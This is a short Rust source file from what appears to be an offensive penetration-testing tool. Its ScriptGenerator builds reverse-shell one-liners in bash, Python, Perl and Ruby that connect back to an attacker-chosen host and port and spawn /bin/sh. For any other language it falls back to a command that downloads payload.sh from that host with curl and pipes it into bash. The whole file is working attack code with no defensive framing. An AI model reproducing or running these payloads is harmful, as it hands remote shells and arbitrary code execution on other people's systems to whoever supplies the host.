// Cross-platform script payload generator
use crate::cli::banner;

pub struct ScriptGenerator;

impl ScriptGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, lang: &str) -> String {
        banner::print_exploiting("CROSS-SCRIPT", &format!("{}:{}", lhost, lport));
        
        match lang {
            "bash" => format!("bash -i >& /dev/tcp/{}/{} 0>&1", lhost, lport),
            "python" => format!("python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{}\",{ }));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
            "perl" => format!("perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}}'", lhost, lport),
            "ruby" => format!("ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", lhost, lport),
            _ => format!("curl -s http://{}:{}/payload.sh | bash", lhost, lport),
        }
    }
}
